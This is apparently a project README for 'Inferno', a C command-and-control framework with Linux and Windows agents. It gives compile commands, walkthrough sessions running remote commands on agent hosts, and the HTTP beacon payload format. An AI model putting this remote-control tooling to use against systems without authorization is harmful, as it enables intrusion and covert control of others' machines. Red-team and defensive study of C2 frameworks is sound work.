# Inferno
![Inferno Logo](/assets/images/Inferno.png)

## Note
"Exploring the digital realm through C feels like journeying through the fiery depths of Inferno with nothing but a trusty torch in hand. It's not just coding; it's an adventure, where every line of C unlocks a new door to discovery in the digital underworld."

## Cortex Security (CS) C2
* Client/Server channel over TCP
* Server/Agent channel over HTTP
* Listing HTTP listeners
* Starting HTTP listeners
* Stopping HTTP listeners
* Listing HTTP sessions
* Entering HTTP sessions
* Destroying HTTP sessions
* Switching sessions
* Linux agent
* Windows agent

## Architecture
![Inferno Architecture](/assets/images/architecture.png)

### Supported commands
| Mode | Command | Example | Description |
| ---  | --- | --- | --- |
| HELP | help | / | Show help menu |
| EXIT | exit | / | Exit C2 |
| LIST listeners | listeners | / | List actives listeners |
| START listener | http | http 127.0.0.1 80 | Start an HTTP listener |
| STOP listener | stop | stop http 1 | Stop listener HTTP with ID 1 |
| LIST sessions | sessions | / | List actives sessions
| ENTER session | enter | enter 1 | Enter inside session with ID 1 |
| DESTROY session | kill | kill 1 | Destroy session with ID 1 |

### Supported session commands
| Mode | Command | Description
| --- | --- | --- |
| EXIT | exit | Exit session |
| WHOAMI | whoami | Get user login |
| HOSTNAME | hostname | Get machine hostname |
| LIST | ls | List files |
| DIRECTORY | pwd | Print current directory |
| CHANGE DIRECTORY | cd | Change the current directory |
| READ | cat | Read file |
> Some commands can be run with arguments 

## Manual

### Compiling instructions
Navigate to the project directory and run:
```bash
gcc client.c -o client
```
```bash
gcc server.c -o server
```
```bash
gcc devil-lin.c -o devil-lin
```
```bash
gcc devil-win.c -o devil-win
```
> More devil-lin with different ports 80, 8080, 8000 etc

### Utilisation instructions
First you will need to start the server
```bash
┌──(asx㉿asx)-[~/Inferno]
└─$ ./server
Initializing socket...
Binding socket to Inferno address...
Listening to 127.0.0.1:33333
Accepting client...
```
> Starting the server

Once the server is started it will listen on port 33333. Now you can start the client
```bash
┌──(asx㉿asx)-[~/Inferno]
└─$ ./client

  _     <-. (`-')_            (`-')  _   (`-') <-. (`-')_                
 (_)       \( OO) )  <-.      ( OO).-/<-.(OO )    \( OO) )     .->       
 ,-(`-'),--./ ,--/(`-')-----.(,------.,------,),--./ ,--/ (`-')----.     
 | ( OO)|   \ |  |(OO|(_\---' |  .---'|   /`. '|   \ |  | ( OO).-.  '    
 |  |  )|  . '|  |)/ |  '--. (|  '--. |  |_.' ||  . '|  |)( _) | |  |    
(|  |_/ |  |\    | \_)  .--'  |  .--' |  .   .'|  |\    |  \|  |)|  |    
 |  |'->|  | \   |  `|  |_)   |  `---.|  |\  \ |  | \   |   '  '-'  '    
 `--'   `--'  `--'   `--'     `------'`--' '--'`--'  `--'    `-----'     

Info: X joined session
[>] Initializing socket...
[+] Socket initialized
[>] Connecting to server...
[+] Connected to server

[ASX]@[INFERNO]> 
```
> Starting the client

You will see the connection is accepted. Now you can start an HTTP listener on port 80
```bash
[ASX]@[INFERNO]> http 192.168.1.40 8080
[+] Result:
HTTP/1.0 200 OK
```
> Starting an HTTP listener on port 8080

Lets start another listener on port 80.
```bash
[ASX]@[INFERNO]> http 192.168.1.40 80
[+] Result:
HTTP/1.0 200 OK
```
> Starting another HTTP listener on port 80
Now we will list active listeners
```bash
[ASX]@[INFERNO]> listeners
[+] Result:
ID	PROTOCOL	ADDRESS	PORT
==	========	=======	====
1	http		192.168.1.40	8080
2	http		192.168.1.40	80
```
> Listing our listeners

You can launch an agent by the following command:
```bash
┌──(asx㉿asx)-[~/Inferno]
└─$ ./devil-lin8080
Initializing socket...
Connecting...
Connected
```
> Starting a linux agent

We can list our sessions
```bash
[ASX]@[INFERNO]> sessions
[+] Result:
ID	COMMUNICATION	REMOTE ADDRESS
==	=============	===========
1	http	192.168.1.40	8080
```
> Linux session is ready

Now we can also launch a windows agent:
```powershell
PS C:\Users\Administrator> ./a.exe
Hello ASX
Initializing socket...
Connecting...
Connected
```
> Starting windows agent

We can list to see if session windows joined
```bash
[ASX]@[INFERNO]> sessions
[+] Result:
ID	COMMUNICATION	REMOTE ADDRESS
==	=============	===========
1	http	192.168.1.40	8080
2	http	192.168.1.40	80
```
> Both linux and windows sessions are there showing there remote address

Now you can enter session to interact with agent, lets start with windows one
```bash
[ASX]@[INFERNO]> enter 2
[+] Result:
XXX
[+] Entering session
```
> Entering the windows session

We will said multiple commands:
whoami
```bash
[ASX]@[SESSION]> whoami
[>] Sending 6 bytes to server...
[>] Receiving 15 bytes from server...
[+] Result:
Administrator


[ASX]@[SESSION]> 
```

pwd
```bash
[ASX]@[SESSION]> pwd
[>] Sending 3 bytes to server...
[>] Receiving 24 bytes from server...
[+] Result:
C:\Users\Administrator


[ASX]@[SESSION]> 
```

hostname
```bash
[ASX]@[SESSION]> hostname
[>] Sending 8 bytes to server...
[>] Receiving 17 bytes from server...
[+] Result:
WIN-KIIR8T1ORA6


[ASX]@[SESSION]> 
```

Now its time to send commands from linux
```bash
[ASX]@[SESSION]> exit
[>] Sending 4 bytes to server...

[ASX]@[INFERNO]> 
```
```bash
[ASX]@[INFERNO]> enter 1
[+] Result:
XXX
[+] Entering session
```
```bash
[ASX]@[SESSION]> whoami
[>] Sending 6 bytes to server...
[>] Receiving 5 bytes from server...
[+] Result:
asx


[ASX]@[SESSION]> 
```
Its now time to exit Inferno
```bash
[ASX]@[INFERNO]> exit
[>] Exiting Inferno...
[+] Exited
```
> Exiting C2

## Drawbacks
> [!NOTE]
> Readme not updated to latest

## Infos
> [!TIP]
> You can analyze the content of the payload sent and received
```bash
==========START PAYLOAD==========
Receiving from client:
POST /endpoint HTTP/1.0
Host: inferno.com
Content-Type: application/json
Content-Length: 20
Connection: close

{'payload':'whoami'}
Sending to agent:

POST /endpoint HTTP/1.0
Host: inferno.com
Content-Type: application/json
Content-Length: 20
Connection: close

{'payload':'whoami'}
Received from agent: asx
Sending to client: asx
===========END PAYLOAD===========
```
> Analyzing payload in server message

## End of transmission
